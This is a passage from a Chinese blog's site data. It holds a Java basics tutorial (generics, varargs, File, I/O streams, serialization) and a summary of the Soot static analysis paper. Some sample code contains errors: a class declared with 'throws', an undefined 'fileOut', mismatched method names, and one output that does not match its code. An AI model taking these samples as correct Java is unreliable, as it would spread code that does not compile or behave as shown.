System.out.println(s); &#125; &#125;&#125; Collection虽然可以存储各种对象，但实际上通常Collection只存储同一类型对象。例如都是存储字符串对象。因此在JDK5之后，新增了泛型(Generic)语法，让人们在设计API时可以指定类或方法支持泛型，这样我们使用API的时候也变得更为简洁，并得到了编译时期的语法检查。 泛型例如，API中的ArrayList集合： 123456class ArrayList&lt;E&gt;&#123; public boolean add(E e)&#123; &#125; public E get(int index)&#123; &#125; ....&#125; 使用泛型： 即什么时候确定泛型。 在创建对象的时候确定泛型 例如，ArrayList&lt;String&gt; list = new ArrayList&lt;String&gt;(); 此时，变量E的值就是String类型,那么我们的类型就可以理解为： 123456class ArrayList&lt;String&gt;&#123; public boolean add(String e)&#123; &#125; public String get(int index)&#123; &#125; ...&#125; 此时，变量E的值就是Integer类型,那么我们的类型就可以理解为： 123456class ArrayList&lt;Integer&gt; &#123; public boolean add(Integer e) &#123; &#125; public Integer get(int index) &#123; &#125; ...&#125; 举例自定义泛型类123456789101112public class MyGenericClass&lt;MVP&gt; &#123; //没有MVP类型，在这里代表 未知的一种数据类型 未来传递什么就是什么类型 private MVP mvp; public void setMVP(MVP mvp) &#123; this.mvp = mvp; &#125; public MVP getMVP() &#123; return mvp; &#125;&#125; 使用: 123456789101112131415public class GenericClassDemo &#123; public static void main(String[] args) &#123; // 创建一个泛型为String的类 MyGenericClass&lt;String&gt; my = new MyGenericClass&lt;String&gt;(); // 调用setMVP my.setMVP(\"大胡子登登\"); // 调用getMVP String mvp = my.getMVP(); System.out.println(mvp); //创建一个泛型为Integer的类 MyGenericClass&lt;Integer&gt; my2 = new MyGenericClass&lt;Integer&gt;(); my2.setMVP(123); Integer mvp2 = my2.getMVP(); &#125;&#125; 含有泛型的方法例如： 123456789public class MyGenericMethod &#123; public &lt;MVP&gt; void show(MVP mvp) &#123; System.out.println(mvp.getClass()); &#125; public &lt;MVP&gt; MVP show2(MVP mvp) &#123; return mvp; &#125;&#125; 使用格式：调用方法时，确定泛型的类型 12345678910public class GenericMethodDemo &#123; public static void main(String[] args) &#123; // 创建对象 MyGenericMethod mm = new MyGenericMethod(); // 演示看方法提示 mm.show(\"aaa\"); mm.show(123); mm.show(12.45); &#125;&#125; 含有泛型的接口定义格式： 1修饰符 interface接口名&lt;代表泛型的变量&gt; &#123; &#125; 例如: 12345public interface MyGenericInterface&lt;E&gt;&#123; public abstract void add(E e); public abstract E getE(); &#125; 使用格式： 1、定义类时确定泛型的类型 例如 1234567891011public class MyImp1 implements MyGenericInterface&lt;String&gt; &#123; @Override public void add(String e) &#123; // 省略... &#125; @Override public String getE() &#123; return null; &#125;&#125; 此时，泛型E的值就是String类型。 2、始终不确定泛型的类型，直到创建对象时，确定泛型的类型 例如 1234567891011public class MyImp2&lt;E&gt; implements MyGenericInterface&lt;E&gt; &#123; @Override public void add(E e) &#123; // 省略... &#125; @Override public E getE() &#123; return null; &#125;&#125; 确定泛型： 123456789/* * 使用 */public class GenericInterface &#123; public static void main(String[] args) &#123; MyImp2&lt;String&gt; my = new MyImp2&lt;String&gt;(); my.add(\"aa\"); &#125;&#125; 通配符当使用泛型类或者接口时，传递的数据中，泛型类型不确定，可以通过通配符&lt;?&gt;表示。但是一旦使用泛型的通配符后，只能使用Object类中的共性方法，集合中元素自身方法无法使用。 通配符基本使用泛型的通配符:不知道使用什么类型来接收的时候,此时可以使用表示未知通配符。 此时只能接受数据,不能往该集合中存储数据。 举个例子大家理解使用即可： 12345678public static void main(String[] args) &#123; Collection&lt;Integer&gt; list1 = new ArrayList&lt;Integer&gt;(); getElement(list1); Collection&lt;String&gt; list2 = new ArrayList&lt;String&gt;(); getElement(list2);&#125;public static void getElement(Collection&lt;?&gt; coll)&#123;&#125;//？代表可以接收任意类型 通配符高级使用—-受限泛型之前设置泛型的时候，实际上是可以任意设置的，只要是类就可以设置。但是在JAVA的泛型中可以指定一个泛型的上限和下限。 泛型的上限： 格式： 类型名称 &lt;? extends 类 &gt; 对象名称 意义： 只能接收该类型及其子类 泛型的下限： 格式： 类型名称 &lt;? super 类 &gt; 对象名称 意义： 只能接收该类型及其父类型 比如：现已知Object类，String 类，Number类，Integer类，其中Number是Integer的父类。 123456789101112131415161718192021public static void main(String[] args) &#123; Collection&lt;Integer&gt; list1 = new ArrayList&lt;Integer&gt;(); Collection&lt;String&gt; list2 = new ArrayList&lt;String&gt;(); Collection&lt;Number&gt; list3 = new ArrayList&lt;Number&gt;(); Collection&lt;Object&gt; list4 = new ArrayList&lt;Object&gt;(); getElement(list1); getElement(list2);//报错 getElement(list3); getElement(list4);//报错 getElement2(list1);//报错 getElement2(list2);//报错 getElement2(list3); getElement2(list4); &#125;// 泛型的上限：此时的泛型?，必须是Number类型或者Number类型的子类public static void getElement1(Collection&lt;? extends Number&gt; coll)&#123;&#125;// 泛型的下限：此时的泛型?，必须是Number类型或者Number类型的父类public static void getElement2(Collection&lt;? super Number&gt; coll)&#123;&#125; 可变参数在JDK1.5之后，如果我们定义一个方法需要接受多个参数，并且多个参数类型一致，我们可以对其简化成如下格式： 1修饰符 返回值类型 方法名(参数类型... 形参名)&#123; &#125; 其实这个书写完全等价与 1修饰符 返回值类型 方法名(参数类型[] 形参名)&#123; &#125; 只是后面这种定义，在调用时必须传递数组，而前者可以直接传递数据即可。 JDK1.5以后。出现了简化操作。 … 用在参数上，称之为可变参数。 同样是代表数组，但是在调用这个带有可变参数的方法时，不用创建数组(这就是简单之处)，直接将数组中的元素，作为实际参数进行传递，其实编译成的class文件，将这些元素先封装到一个数组中，再进行传递。这些动作都在编译.class文件时自动完成的。 1234567891011121314151617181920212223242526272829public class ChangeArgs &#123;public static void main(String[] args) &#123;int[] arr = &#123; 1, 4, 62, 431, 2 &#125;;int sum = getSum(arr);System.out.println(sum);// 6 7 2 12 2121// 求 这几个元素和 6 7 2 12 2121int sum2 = getSum(6, 7, 2, 12, 2121);System.out.println(sum2);&#125;/** 完成数组 所有元素的求和 原始写法public static int getSum(int[] arr)&#123;int sum = 0;for(int a : arr)&#123;sum += a;&#125;return sum;&#125;*///可变参数写法public static int getSum(int... arr) &#123;int sum = 0;for (int a : arr) &#123;sum += a;&#125;return sum;&#125;&#125; File类java.io.File 类是文件和目录路径名的抽象表示，主要用于文件和目录的创建、查找和删除等操作。 构造方法public File(String pathname) ：通过将给定的路径名字符串转换为抽象路径名来创建新的 File实例。 public File(String parent, String child)：从父路径名字符串和子路径名字符串创建新的 File实例。 public File(File parent, String child)：从父抽象路径名和子路径名字符串创建新的 File实例。 构造举例，代码如下： 1234567891011121314// 文件路径名String pathname = \"D:\\\\aaa.txt\";File file1 = new File(pathname);// 文件路径名String pathname2 = \"D:\\\\aaa\\\\bbb.txt\";File file2 = new File(pathname2);// 通过父路径和子路径字符串String parent = \"d:\\\\aaa\";String child = \"bbb.txt\";File file3 = new File(parent, child);// 通过父级File对象和子路径字符串File parentDir = new File(\"d:\\\\aaa\");String child = \"bbb.txt\";File file4 = new File(parentDir, child); 获取功能的方法public String getAbsolutePath() ：返回此File的绝对路径名字符串。 public String getPath()：将此File转换为路径名字符串。 public String getName()：返回由此File表示的文件或目录的名称。 public long length() ：返回由此File表示的文件的长度。 判断功能的方法public boolean exists() ：此File表示的文件或目录是否实际存在。 public boolean isDirectory() ：此File表示的是否为目录。 public boolean isFile() ：此File表示的是否为文件。 创建删除的方法public boolean createNewFile()：当且仅当具有该名称的文件尚不存在时，创建一个新的空文件。 public boolean delete() ：删除由此File表示的文件或目录。 public boolean mkdir()：创建由此File表示的目录。 public boolean mkdirs() ：创建由此File表示的目录，包括任何必需但不存在的父目录。 目录遍历的方法public String[] list() ：返回一个String数组，表示该File目录中的所有子文件或目录。 public File[] listFiles() ：返回一个File数组，表示该File目录中的所有的子文件或目录。 123456789101112131415public class FileFor &#123;public static void main(String[] args) &#123;File dir = new File(\"d:\\\\java_code\");//获取当前目录下的文件以及文件夹的名称。String[] names = dir.list();for(String name : names)&#123;System.out.println(name);&#125;//获取当前目录下的文件以及文件夹对象，只要拿到了文件对象，那么就可以获取更多信息File[] files = dir.listFiles();for (File file : files) &#123;System.out.println(file);&#125;&#125;&#125; I/O 流一切视角以内存为主。 根据数据的流向分为：输入流和输出流。 输入流 ：把数据从 其他设备 上读取到 内存 中的流。 输出流 ：把数据从 内存 中写出到 其他设备 上的流。 格局数据的类型分为：字节流和字符流。 字节流 ：以字节为单位，读写数据的流。 字符流 ：以字符为单位，读写数据的流。 字节流一切文件数据(文本、图片、视频等)在存储时，都是以二进制数字的形式保存，都一个一个的字节，那么传输时一 样如此。所以，字节流可以传输任意文件数据。在操作流的时候，我们要时刻明确： 无论使用什么样的流对象，底层传输的始终为二进制数据。 OutputStream 字节输出流java.io.OutputStream 是表示字节输出流的所有类的超类，将指定的字节信息写出到目的地。它定义了字节输出流的基本共性功能方法。 public void close()：关闭此输出流并释放与此流相关联的任何系统资源。 public void flush()：刷新此输出流并强制任何缓冲的输出字节被写出。 public void write(byte[] b) ：将 b.length字节从指定的字节数组写入此输出流。 public void write(byte[] b, int off, int len)：从指定的字节数组写入 len字节，从偏移量 off开始输出到此输出流。 public abstract void write(int b)：将指定的字节输出流。 小贴士： close方法，当完成流的操作时，必须调用此方法，释放系统资源。 FileOutputStream类OutputStream 有很多子类，我们从最简单的一个子类开始。 java.io.FileOutputStream 类是文件输出流，用于将数据写出到文件里面。 构造方法： public FileOutputStream(File file) ：创建文件输出流以写入由指定的 File对象表示的文件。 public FileOutputStream(String name)： 创建文件输出流以指定的名称写入文件。 当你创建一个流对象时，必须传入一个文件路径。该路径下，如果没有这个文件，会创建该文件。如果有这个文件，会清空这个文件的数据。 Demo: 123456789public class FileOutputStreamConstructor throws IOException &#123;public static void main(String[] args) &#123;// 使用File对象创建流对象File file = new File(\"a.txt\");FileOutputStream fos = new FileOutputStream(file);// 使用文件名称创建流对象FileOutputStream fos = new FileOutputStream(\"b.txt\");&#125;&#125; 写出字节： write(int b) 方法，每次可以写出一个字节数据，代码使用演示： 123456789101112public static void main(String[] args) throws IOException &#123;// 使用文件名称创建流对象FileOutputStream fos = new FileOutputStream(\"fos.txt\");// 写出数据fos.write(97); // 写出第1个字节fos.write(98); // 写出第2个字节fos.write(99); // 写出第3个字节// 关闭资源，一定记得fos.close();&#125;输出结果：abc 写出字节数组： write(byte[] b) 每次可以写出数组中的数据，代码使用演示： 1234567891011121314public class FOSWrite &#123;public static void main(String[] args) throws IOException &#123;// 使用文件名称创建流对象FileOutputStream fos = new FileOutputStream(\"fos.txt\");// 字符串转换为字节数组byte[] b = \"程序员\".getBytes();// 写出字节数组数据fos.write(b);// 关闭资源fos.close();&#125;&#125;输出结果：程序员 写出指定长度字节数组： write(byte[] b, int off, int len),每次写出从off索引开始，len个字节，代码使用演示： 1234567891011121314public class FOSWrite &#123;public static void main(String[] args) throws IOException &#123;// 使用文件名称创建流对象FileOutputStream fos = new FileOutputStream(\"fos.txt\");// 字符串转换为字节数组byte[] b = \"abcde\".getBytes();// 写出从索引2开始，2个字节。索引2是c，两个字节，也就是cd。fos.write(b,2,2);// 关闭资源fos.close();&#125;&#125;输出结果：cd InputStream 字节输入流java.io.InputStream 抽象类是表示字节输入流的所有类的超类，可以读取字节信息到内存中。 它定义了字节输入流的基本共性功能方法。 public void close()：关闭此输入流并释放与此流相关联的任何系统资源。 public abstract int read() ： 从输入流读取数据的下一个字节。 public int read(byte[] b) ： 从输入流中读取一些字节数，并将它们存储到字节数组 b中 。 FileInputStream类java.io.FileInputStream 类是文件输入流，从文件中读取字节。 构造方法： FileInputStream(File file) ： 通过打开与实际文件的连接来创建一个 FileInputStream ，该文件由文件系统中的 File对象 file命名。 FileInputStream(String name) ： 通过打开与实际文件的连接来创建一个 FileInputStream ，该文件由文件系统中的路径名 name命名。 123456789public class FileInputStreamConstructor throws IOException&#123;public static void main(String[] args) &#123;// 使用File对象创建流对象File file = new File(\"a.txt\");FileInputStream fos = new FileInputStream(file);// 使用文件名称创建流对象FileInputStream fos = new FileInputStream(\"b.txt\");&#125;&#125; 读取字节： read 方法，【每次】可以读取一个字节的数据，提升为int类型，读取到文件末尾，返回 -1 ，代码使用演示： 1234567891011121314151617181920212223242526272829public class FISRead &#123;public static void main(String[] args) throws IOException&#123;// 使用文件名称创建流对象FileInputStream fis = new FileInputStream(\"read.txt\");// 读取数据，返回一个字节int read = fis.read();System.out.println((char) read);read = fis.read();System.out.println((char) read);read = fis.read();System.out.println((char) read);read = fis.read();System.out.println((char) read);read = fis.read();System.out.println((char) read);// 读取到末尾,返回‐1read = fis.read();System.out.println(read);// 关闭资源fis.close();&#125;&#125;输出结果：abcde‐1 循环改进读取方式，代码使用演示： 1234567891011121314151617181920public class FISRead &#123;public static void main(String[] args) throws IOException&#123;// 使用文件名称创建流对象FileInputStream fis = new FileInputStream(\"read.txt\");// 定义变量，保存数据int b ；// 循环读取while ((b = fis.read())!=‐1) &#123;System.out.println((char)b);&#125;// 关闭资源fis.close();&#125;&#125;输出结果：abcde 使用字节数组读取： read(byte[] b)，每次读取b的长度个字节到数组中，返回读取到的有效字节个数，读 取到末尾时，返回 -1 ，代码使用演示： 123456789101112131415161718192021public class FISRead &#123;public static void main(String[] args) throws IOException&#123;// 使用文件名称创建流对象.FileInputStream fis = new FileInputStream(\"read.txt\"); // 文件中为abcde// 定义变量，作为有效个数int len ；// 定义字节数组，作为装字节数据的容器,大小为2byte[] b = new byte[2];// 循环读取while (( len= fis.read(b))!=‐1) &#123;// 每次读取后,把数组变成字符串打印System.out.println(new String(b，0，len));&#125;// 关闭资源fis.close();&#125;&#125;输出结果：abcded 复制图片文件，代码使用演示： 12345678910111213141516171819202122public class Copy &#123;public static void main(String[] args) throws IOException &#123;// 1.创建流对象// 1.1 指定数据源FileInputStream fis = new FileInputStream(\"D:\\\\test.jpg\");// 1.2 指定目的地FileOutputStream fos = new FileOutputStream(\"test_copy.jpg\");// 2.读写数据// 2.1 定义数组byte[] b = new byte[1024];// 2.2 定义长度int len;// 2.3 循环读取while ((len = fis.read(b))!=‐1) &#123;// 2.4 写出数据fos.write(b, 0 , len);&#125;// 3.关闭资源fos.close();fis.close();&#125;&#125; 缓冲流 字节缓冲流 BufferedInputStream/OutputStream构造方法 public BufferedInputStream(InputStream in) ：创建一个 新的缓冲输入流。 public BufferedOutputStream(OutputStream out) ： 创建一个新的缓冲输出流。 1234// 创建字节缓冲输入流BufferedInputStream bis = new BufferedInputStream(new FileInputStream(\"bis.txt\"));// 创建字节缓冲输出流BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(\"bos.txt\")); 123456789101112131415161718192021222324public class BufferedDemo &#123;public static void main(String[] args) throws FileNotFoundException &#123;// 记录开始时间long start = System.currentTimeMillis();// 创建流对象try (BufferedInputStream bis = new BufferedInputStream(new FileInputStream(\"jdk9.exe\"));BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(\"copy.exe\"));)&#123;// 读写数据int len;byte[] bytes = new byte[8*1024];while ((len = bis.read(bytes)) != ‐1) &#123;bos.write(bytes, 0 , len);&#125;&#125; catch (IOException e) &#123;e.printStackTrace();&#125;// 记录结束时间long end = System.currentTimeMillis();System.out.println(\"缓冲流使用数组复制时间:\"+(end ‐ start)+\" 毫秒\");&#125;&#125;缓冲流使用数组复制时间:666 毫秒 特有方法： 字符缓冲流的基本方法与普通字符流调用方式一致，不再阐述，我们来看它们具备的特有方法。 BufferedReader： public String readLine() : 读一行文字。 BufferedWriter： public void newLine() : 写一行行分隔符,由系统属性定义符号。 readLine 方法演示，代码如下： 123456789101112131415public class BufferedReaderDemo &#123;public static void main(String[] args) throws IOException &#123;// 创建流对象BufferedReader br = new BufferedReader(new FileReader(\"in.txt\"));// 定义字符串,保存读取的一行文字String line = null;// 循环读取,读取到最后返回nullwhile ((line = br.readLine())!=null) &#123;System.out.print(line);System.out.println(\"‐‐‐‐‐‐\");&#125;// 释放资源br.close();&#125;&#125; 12FileOutputStream fileOut = new FileOutputStream(\"employee.txt\");ObjectOutputStream out = new ObjectOutputStream(fileOut); 1234567891011121314151617181920212223public class SerializeDemo&#123;public static void main(String [] args) &#123;Employee e = new Employee();e.name = \"zhangsan\";e.address = \"beiqinglu\";e.age = 20;try &#123;// 创建序列化流对象ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\"employee.txt\"));// 写出对象out.writeObject(e);// 释放资源out.close();fileOut.close();System.out.println(\"Serialized data is saved\"); // 姓名，地址被序列化，年龄没有被序列化。&#125; catch(IOException i) &#123;i.printStackTrace();&#125;&#125;&#125;输出结果：Serialized data is saved 12345678// 创建反序列化流FileInputStream fileIn = new FileInputStream(\"employee.txt\");ObjectInputStream in = new ObjectInputStream(fileIn);// 读取一个对象e = (Employee) in.readObject();// 释放资源in.close();fileIn.close(); 123456789101112public class PrintDemo &#123;public static void main(String[] args) throws IOException &#123;// 调用系统的打印流,控制台直接输出97System.out.println(97);// 创建打印流,指定文件的名称PrintStream ps = new PrintStream(\"ps.txt\");// 设置系统的打印流流向,输出到ps.txtSystem.setOut(ps);// 调用系统的打印流,ps.txt中输出97System.out.println(97);&#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://0range228.github.io/categories/Java/"}],"tags":[{"name":"Java基础","slug":"Java基础","permalink":"https://0range228.github.io/tags/Java%E5%9F%BA%E7%A1%80/"}]},{"title":"一个Java对象的内存图","slug":"一个Java对象的内存图","date":"2020-04-27T12:59:20.000Z","updated":"2020-04-27T13:36:32.342Z","comments":true,"path":"一个Java对象的内存图/","link":"","permalink":"https://0range228.github.io/%E4%B8%80%E4%B8%AAJava%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%86%85%E5%AD%98%E5%9B%BE/","excerpt":"","text":"","categories":[{"name":"Java","slug":"Java","permalink":"https://0range228.github.io/categories/Java/"}],"tags":[{"name":"JVM","slug":"JVM","permalink":"https://0range228.github.io/tags/JVM/"}]},{"title":"Soot","slug":"Soot","date":"2020-04-24T08:49:59.000Z","updated":"2020-04-27T13:37:32.683Z","comments":true,"path":"Soot/","link":"","permalink":"https://0range228.github.io/Soot/","excerpt":"序言 跬步而不休，跛鳖千里。 今天来学习Soot，主要来膜拜这篇神文。 http://sable.github.io/soot/resources/lblh11soot.pdf","text":"序言 跬步而不休，跛鳖千里。 今天来学习Soot，主要来膜拜这篇神文。 http://sable.github.io/soot/resources/lblh11soot.pdf I. INTRODUCTIONSoot是一款针对Java语言进行静态分析的框架，诞生于2000年。 它允许研究人员在它的基础上开发静态分析工具。 针对它的核心来说，它是一款编译器。 它接收JVM字节码文件或者Java源码，并且主要返回Java字节码。 Soot的主要特点： 简化JVM的字节码文件，转换为三地址码的中间表示形式； 大量的指针分析； 调用图构造算法API； 可以生成可执行的JVM字节码文件； Ⅱ. FEATURES##程序内特征 intraprocedual Soot的基本中间代码表示形式是Jimple，Jimple就是一种三地址代码。 Jimple诞生的初衷是由于： 直接分析字节码是很困难的。 尽管可以为Java字节码构造控制流图，但是往往隐式的堆栈活动会掩盖住数据流。 并且对于一个给定的字节码指令s来说，基于堆栈的s的输入往往并不是在变址处产生的。 所以soot的作者发现，将数据存储在指定的局部变量中，而不是隐式堆栈中，可以使得数据的局部流(沿着Jimple的控制流图)更加明显。 Jimple内的本地变量会根据（定义-使用链）(define-use chains)进行分类。 Soot内部还有其他中间表示形式： Shimple是基于SSA版本的Jimple； Baf和Grimple是用来生成字节码的； Dava是一个抽象的基于语法树的中间表示，它是由jimple IR反编译生成的。 Java字节码包含了原始源代码的类和方法结构等许多信息，所以在Soot的分析过程中，Soot可以自由地利用类和方法名信息。 Soot还可以为它所分析的方法提供行号和变量名信息。 Soot最强大的一点是用户可以通过指定抽象类和实现该抽象的函数来创建数据流分析。 Soot还为常见的抽象类提供了适配的数据结构实现。 过程间分析 interprocedural复杂的静态分析需要调用图和指针信息，这从根本上讲是一个过程间的问题。 Soot包括Spark指针分析工具包，并且还支持基于BDD的PADDLE指针分析框架，该框架增加了上下文相关性。 调用图 Call GraphSoot框架提供了调用图信息。对于每个调用点（call site），静态分析（尤其是过程间分析）需要知道该调用点的所有可能调用目标。 Java的面向对象性质使此问题复杂化，因为被调用者（或目标）的身份取决于虚拟调用的接收者对象的运行时类型，而Java程序中的大多数调用都是虚拟调用。 Spark的调用图构造算法会计算出运行时可能发生的一组调用的近似值。调用图边连接源（表示为（方法，语句）对）和目标（始终是方法中的第一个语句）。 Over-approximation意味着在程序的任何执行中可能发生的任何调用都必须出现在调用图中。 Spark实现了许多不同的调用图构造方法，包括类层次分析和快速类型分析。 但是，我们发现最有效的调用图构造方法是按需进行的，并在计算点对集的同时构建调用图，从CHA调用图作为可到达组的初始近似值的开始方法。 可以通过查询call site生成调用图； 通过调用方法； 或“向后”（按目标方法）。 出于效率考虑，Spark返回迭代器作为调用图查询的结果。 Spark还为客户提供了任何方法或语句的可传递目标集。 最后，Spark还公开了程序的可访问方法集-从程序的入口点可传递地访问的方法集（除程序的main（）方法外，还包括类初始化等）。 指针分析 Pointer Analyses许多静态分析需要指针信息： 它们需要知道两个变量p和q在运行时是否可以引用同一堆对象。 Spark实现了上下文无关的基于子集的指向分析（Andersenstyle）。 分析可以查询要点分析，并获得由PointToSet表示的局部变量或对象字段所指向的对象的抽象。 PointsToSet支持两个查询： 集合中对象的可能类型集合； 两个PointsToSet对象是否具有非空交集。 可能的类型将有关方法调用的可能接收者的信息提供给变量，该变量的值指向设置的模型。 如果变量p和q具有非空交点的指向集，则它们可能指向同一对象。 副作用分析 Side Effects副作用分析建立在（任何基于Soot的）指向和调用图分析之上。 副作用分析可以确定语句s是否可能依赖于语句s’。 它通过为每个语句定义读写集，然后比较它们的交集来工作。 两个具有不相交的读写集的语句是独立的，而先写一个值的语句后跟另一个读相同值的语句遵循一个依赖关系。 Spark的替代和扩展尽管Spark是Soot的基本调用图和指针分析生成器，但它不是唯一的选择。 PADDLE 提供了基于BDD的上下文敏感指针分析； 但是，它在构建时和在运行时都需要额外的依赖关系。 到目前为止，虽然我们已经描述了指针分析都是可能别名分析may-alias，但Soot还包含了过程内必需别名分析must-alias。 对象代表将此必须别名分析与过程内和整个程序的可能别名分析相集成； Spark是整个程序可能别名分析的来源之一。 反射许多Java程序都使用反射来按名称访问类或其成员。 这种反映性访问很难静态分析： 类和方法名称可以在运行时计算，也可以从静态分析无法访问的文件中加载。 一种解决方法是在运行时记录有关反射用法的信息（需要训练），并在执行调用图和指向分析时使用此信息。 Soot输出Soot支持使分析结果可用的多种机制。 开发人员的选择包括： 1）输出转换后的类文件； 2）输出错误信息； 3）生成包含分析结果的HTML或图形； 4）创建（潜在转换的）类文件，并从程序分析中获得结果。 一个使用Soot变换类文件的工具示例是DUSC工具。 该工具通过首先对应用程序执行保留语义的转换以实现动态更新，然后为应用程序的新版本创建Java类，从而可以在运行时进行交换，从而实现Java程序的动态软件更新。 Soot还可以实现不保留语义的转换。 Tkachuk和Dwyer使用Soot生成了系统环境行为的不可执行的摘要，从而简化了系统的后续模型检查。生成的环境摘要包括实际环境的所有可能影响，并使用Java字节码表示，并用特殊的建模原语（使用方法调用编写）扩充了这些摘要。 III. WORKING WITH AND EXTENDING SOOT运行Soot在命令行上运行Soot是与Soot交互的最简单方法。 Jimple代码作为Java字节码的清理版本对人类很有用。实际上，我们专门为此目的创建了Jimple的Jimp方言。它牺牲了可读性的完整性，例如通过省略字段的全名。完整的Jimple可以重新编译为Java字节码，而Jimp对于手动检查最有用。 Soot也可以优化字节码。但是，现代Java虚拟机和实时编译器在优化代码方面做得非常出色（使用仅在运行时可用的信息），因此Soot的优化不会提高常规字节码的性能。该优化对于非标准字节码（例如abc AspectJ编译器生成的字节码）很有用。 运行Soot的另一种方法是通过其Eclipse插件。 Eclipse插件允许用户调用Soot（或其增强版本）。但是，更重要的是，它还允许用户查看Jimple CFG和静态分析结果。特别是，Soot Eclipse插件使开发人员可以在计算时查看流量分析结果。另外，该插件可以显示汇总分析结果的属性。 Building on soot要使用Soot进行程序分析研究，用户必须编写扩展Soot功能的编译器遍历。 Soot提供两种基本的通行证类型：BodyTransformers和SceneTransformers。 BodyTransformer最适合进行过程内分析，并在程序中的每种方法上执行。 SceneTransformer仅执行一次，并且可能会分析并处理整个程序。 这些Transformer属于Packs，它们对应于编译器遍历的集合。我们已经记录了Soot开箱即用的套件包，研究人员可以自由地将其添加到所提供的套件（如果它在适当的阶段运行），或者创建自己的套件。 不同的Transformer可以通过共享包含分析结果的Map或使用属性进行通信。 我们明确选择禁止在IR语句上存储信息（例如，通过对Jimple Stmts进行子类化）来进行分析，因为这很难进行不同的分析。 我们建议用户通过创建自己的自定义主类来向Soot添加通行证，该类通过添加适当的Transformer来操纵Soot的Pack，然后调用Soot main（）方法。 Soot的Eclipse插件可用于生成此用例的模板（文件→新建→示例）。也可以手动调用Soot的main（）方法在自己的代码中调用的不同方法。尽管这是使用Soot的更灵活的方法，但我们不建议大多数用户使用它。 IV. SOOT DEVELOPMENT PROCESS AND COMMUNITYSoot最初是由Raja Vall´ee-Rai提出的理学硕士论文。 最初的开发发生在对Java进行分析的最初兴趣激增期间。 这种情况发生在1999–2000年，并最终发布了可行的过程内Java分析框架Soot 1.0。 Soot确实可以从这些程序的字节码（而不是源代码）开始对Java程序进行复杂的分析。自最初发布以来，Soot已添加了许多功能。 Soot的核心开发围绕麦吉尔大学的Sable实验室进行。 Soot的主要维护者的角色已经在麦吉尔的许多学生和校友中轮换。 A. Support and Community有问题写邮件！ B. Documentation文档的最基本形式是API设计。 第一作者回顾了与Raja进行的有关Soot API设计的广泛讨论。 我们认为核心内部Soot API具有合理的自我文档编制和易用性。 Soot还提供了一些Javadoc文档注释来阐明API，但是提供完整的Javadoc覆盖范围非常繁琐。除非以某种方式众包此类文档，否则期望研究编译器框架附带完整的Javadoc文档注释是不合理的。 我们相信，我们已经为研究编译器提供了人们所希望的最好的东西：良好的API设计以及偶尔的Javadoc注释。 Soot团队还创建了一组文档，解释了如何使用Soot执行各种任务。这些文档将引导读者完成诸如执行数据流分析和向Java类文件添加属性的任务。 soot-survivor-guide soot-wiki 我们要指出的一种Soot帮助形式是错误消息。 两个常见的触发点是OutOfMemoryError和incomplete-classpath错误。 发生内存不足错误是因为Java虚拟机的默认内存分配不足以运行整个程序指针分析。因此，Soot会捕获此错误并显示一条错误消息，告诉用户如何增加内存分配。由于Soot需要程序的所有库来进行指针分析，因此会出现不完整类路径错误。当无法找到所需的类时，建议用户包括jce.jar和jsse.jar文件，它们很可能会丢失。 V. SOOT ’ S PAST EVOLUTION + FUTURE WORK ON SOOTSingletons and multiple Soot runsSoot的最初设计在许多地方都使用了Singleton单例设计模式。 对于希望从自己的客户端代码多次调用Soot的用户而言，这是非常不便的。 我们重构了Soot以消除大多数单例和全局变量，将剩余的全局变量合并为G单例，并实施了静态分析以检测不在G中的单例和全局变量。我们还添加了G.reset（）方法，重置Soot的状态。 Partial programsSoot要求为整个程序分析（例如指针分析）计算sound结果。 但是，许多应用程序（尤其是基于Eclipse的软件工程应用程序）没有或不需要整个程序。 最近，我们还修复了Soot在不使用所有引用库的情况下对Java字节码进行分析的支持。 Java front-end parsersSoot最初不包括Java前端解析器。 幸运的是，这个问题引起了很多关注，并且Soot获得了基于Polyglot的Java前端，以及后来的Java 1.5兼容JastAddbased前端。 Increased efﬁciency在需求驱动的基础上，我们提高了Soot选定零件的性能。 我们注意到，不可能从一开始就预测应该对哪些零件进行优化。 改进了类层次结构，紧密连接的组件，局部类型推断和局部def / uses计算器的应用，从而使Soot受益匪浅。 A. Future Directions for Soot我们确定了Soot未来改进的三个方向：更快的启动和计算时间；过程间分析支持；并支持Java语言扩展。 任何使用整个程序分析结果的分析都必须等待Soot解析成千上万的类文件。问题在于，即使最小的Java程序也包含对Java类库的依赖关系，该依赖关系在库类之间具有广泛的交叉引用。结果是，一旦分析需要指针分析结果，Soot的运行时间就会从不到10秒增加到超过一分钟。我们认为，也许可以使用Gligoric等人的技术一劳永逸地序列化Java类库生成的Jimple代码。这将为Soot分析提供更快的启动时间。从改写Jimple创建代码和使用多个线程创建Jimple代码（还自2000年起就是一个不错的项目）开始，也可以提高性能。 尽管Soot对过程内分析提供了出色的支持，但过程间分析的开发人员却更多地留给了他们自己的设备。如上所述，Soot为新颖的过程间分析的作者提供了SceneTransformer。不幸的是，对于这样的作者，SceneTransformer在构造分析时没有提供任何帮助。特别是，一个Soot用户需要弄清楚如何遍历被分析程序的类，以及如何组合来自不同方法的分析结果。定义常见情况并使其易于编程的一些设计工作可能会帮助很多分析作者。 最后，从历史上看，使用Soot评估语言扩展（例如类型系统扩展）是困难的。尽管Soot对字节码进行了广泛的类型推断，但要在Soot的IR中获取源代码注释（例如类型注释）并不容易。现在，使用JastAdd前端可以更轻松地进行此类研究。但是，我们不知道有任何项目研究Java语言扩展，因此Soot会分析以扩展Java源语言给出的程序。 VI. REFLECTIONS ON SOOT在本节中，我们将介绍在开发Soot方面遇到的困难，为将来的编译器框架提出所需的功能，并以对Soot成功的原因的一些结论作为结论。 我们的经验是，从总体上讲，Soot现在可以完成我们认为会做的事情。 Soot的一个意外应用是用于不完整和不完整的程序分析。 当我们最初设计Soot时，这种分析在研究界是未知的。 然而，在随后的12年中，它们已经变得非常流行。Soot可以毫无问题地进行这种分析。 Difﬁculties我们想强调两个困难：在外部更改存在的情况下保持Soot的最新状态，并鼓励Soot用户做出自己的更改。 自Soot最初发布以来，Java语言已经发生了重大变化。 Java 1.3是2000年Soot 1.0发行时的Java的最新版本，它不包括泛型，invokedynamic，注释或foreach循环以及其他更改。幸运的是，对虚拟机的更改受到了更大的限制。但是，对于Soot团队来说，要跟上Java虚拟机（用于字节码输入）的变化，尤其是Java语言（对于Java前端）的变化，是很难的。对于Soot 